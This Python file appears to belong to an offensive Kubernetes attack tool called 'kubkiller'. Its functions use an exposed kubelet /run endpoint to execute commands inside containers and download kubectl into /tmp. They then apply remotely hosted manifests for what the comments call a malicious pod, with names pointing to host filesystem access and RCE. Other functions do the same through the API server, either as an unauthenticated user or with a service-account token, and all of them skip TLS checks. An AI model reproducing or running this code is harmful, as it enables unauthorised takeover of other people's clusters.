import requests, pty

def pod_deploy(hostFull, pod, namespace, container, id, pod_id):
    
    pods_deploy = {1:"./tmp/kubectl apply -f https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/filesystem-node.yml", 2:"./tmp/kubectl apply -f https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/busybox-rce-node.yml"}

    wget_verify = requests.post(hostFull + "/run/" + namespace[pod_id-1] + "/" + pod[pod_id-1] + "/" + container[pod_id-1], data={"cmd":"wget -h"}, verify=False)
    wget_verify_bytes = wget_verify.content
    wget_verify_str = wget_verify_bytes.decode("utf-8")

    # Se o wget não estiver instalado, não será possível realizar o deploy do pod.
    if "126:" in wget_verify_str:
        print("*** Not possible to install a busybox pod! ***")
    # Caso o wget esteja instalado, é possível realizar o deploy.
    else:
        print("+++ May be possible to install a busybox pod +++")
        print()
        print("trying...")
        # Verificando se o kubectl está presente na pasta /TMP.
        kubectl_teste = requests.post(hostFull + "/run/" + namespace[pod_id-1] + "/" + pod[pod_id-1] + "/" + container[pod_id-1], data={"cmd":"./tmp/kubectl -h"}, verify=False)
        kubectl_teste_bytes = kubectl_teste.content
        kubectl_teste_str = kubectl_teste_bytes.decode("utf-8")
                        
        # Se não estiver, o mesmo é baixado e dado a permissão de execução na pasta!
        if "126:" in kubectl_teste_str:
            print("*** Kubectl not installed ***")
            kubectl = requests.post(hostFull + "/run/" + namespace[pod_id-1] + "/" + pod[pod_id-1] + "/" + container[pod_id-1], data={"cmd":"wget https://storage.googleapis.com/kubernetes-release/release/v1.20.2/bin/linux/amd64/kubectl -P /tmp/"}, verify=False)
            kubectl_executavel = requests.post(hostFull + "/run/" + namespace[pod_id-1] + "/" + pod[pod_id-1] + "/" + container[pod_id-1], data={"cmd":"chmod +x /tmp/kubectl"}, verify=False)
        else:
            print("*** Kubectl already installed in the folder /tmp/ ***")

        # Após baixado e configurado, o kubectl é utilizado na pasta /tmp para realizar o deploy de um pod malicioso.
        deploy_req = requests.post(hostFull + "/run/" + namespace[pod_id-1] + "/" + pod[pod_id-1] + "/" + container[pod_id-1], data={"cmd":pods_deploy[id]}, verify=False)
        deploy_res_bytes = deploy_req.content
        deploy_res_str = deploy_res_bytes.decode("utf-8")
        if "pod/busybox" in deploy_res_str:
            print("+++ BUSYBOX POD SUCCESSFULLY CREATED! +++")
        else:
            print("--- NOT POSSIBLE CREATE A " + id + " POD ---")

def pod_deploy_api(hostFull, pod_id):
    pods_deploy = {1:"https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/filesystem-node.yml", 2:"https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/busybox-rce-node.yml"}

    print("+++ May be possible to install a busybox pod +++")

    deploy_pod = "kubectl --insecure-skip-tls-verify --username=system:unauthenticated -s"+(hostFull)+" -n kube-system apply -f "+ pods_deploy[pod_id]
    deploy_pod = deploy_pod.split(" ")
    pty.spawn(deploy_pod)

def pod_delete(hostFull, pod, namespace, container, pod_id, pod_id_malicioso):

    wget_verify = requests.post(hostFull + "/run/" + namespace[pod_id] + "/" + pod[pod_id] + "/" + container[pod_id], data={"cmd":"wget -h"}, verify=False)
    wget_verify_bytes = wget_verify.content
    wget_verify_str = wget_verify_bytes.decode("utf-8")

    # Se o wget não estiver instalado, não será possível realizar o deploy do pod.
    if "126:" in wget_verify_str:
        print("*** NOT POSSIBLE TO DELETE THE BUSYBOX POD! ***")
    # Caso o wget esteja instalado, é possível realizar o deploy.
    else:
        # Verificando se o kubectl está presente na pasta /TMP.
        kubectl_teste = requests.post(hostFull + "/run/" + namespace[pod_id] + "/" + pod[pod_id] + "/" + container[pod_id], data={"cmd":"./tmp/kubectl -h"}, verify=False)
        kubectl_teste_bytes = kubectl_teste.content
        kubectl_teste_str = kubectl_teste_bytes.decode("utf-8")
                        
        # Se não estiver, o mesmo é baixado e dado a permissão de execução na pasta!
        if "126:" in kubectl_teste_str:
            print("*** KUBECTL NOT INSTALLED! ***")
            kubectl = requests.post(hostFull + "/run/" + namespace[pod_id] + "/" + pod[pod_id] + "/" + container[pod_id], data={"cmd":"wget https://storage.googleapis.com/kubernetes-release/release/v1.20.2/bin/linux/amd64/kubectl -P /tmp/"}, verify=False)
            kubectl_executavel = requests.post(hostFull + "/run/" + namespace[pod_id] + "/" + pod[pod_id] + "/" + container[pod_id], data={"cmd":"chmod +x /tmp/kubectl"}, verify=False)
        else:
            print("*** Kubectl already install in /tmp/ ***")

        # Após baixado e configurado, o kubectl é utilizado na pasta /tmp para realizar o deploy de um pod malicioso.
        deploy_req = requests.post(hostFull + "/run/" + namespace[pod_id] + "/" + pod[pod_id] + "/" + container[pod_id], data={"cmd":"./tmp/kubectl -n kube-system delete pod " + (pod_id_malicioso)}, verify=False)
        deploy_res_bytes = deploy_req.content
        deploy_res_str = deploy_res_bytes.decode("utf-8")
        if "deleted" in deploy_res_str:
            print("+++ BUSYBOX POD SUCCESSFULLY DELETED! +++")
        else:
            print("--- NOT POSSIBLE DELETE A BUSYBOX POD ---")


def pod_delete_api(hostFull, ns, pod_name):
    deploy_pod = "kubectl --insecure-skip-tls-verify=true --username=system:unauthenticated --server=" + (hostFull) + " -n " + (ns) + " delete pod "+ (pod_name)
    deploy_pod = deploy_pod.split(" ")
    pty.spawn(deploy_pod)
    print()

def pod_deploy_service(host, serviceaccount, ns, id):
    pods_deploy = {1:"https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/filesystem-node.yml", 2:"https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/busybox-rce-node.yml"}

    print("+++ May be possible to install a busybox pod +++")

    deploy = "kubectl --insecure-skip-tls-verify=true --server=https://" + (host) + ":8443 --token=" + (serviceaccount) + " -n " + (ns) + " apply -f " + pods_deploy[id]
    deploy = deploy.split(" ")
    print()
    pty.spawn(deploy)
    print()

def pod_delete_service(host, serviceaccount, ns, pod_name):
    deploy_pod = "kubectl --insecure-skip-tls-verify=true --server=https://" + (host) + ":8443 --token=" + (serviceaccount) + " -n " + (ns) + " delete pod "+ (pod_name)
    deploy_pod = deploy_pod.split(" ")
    pty.spawn(deploy_pod)
    print()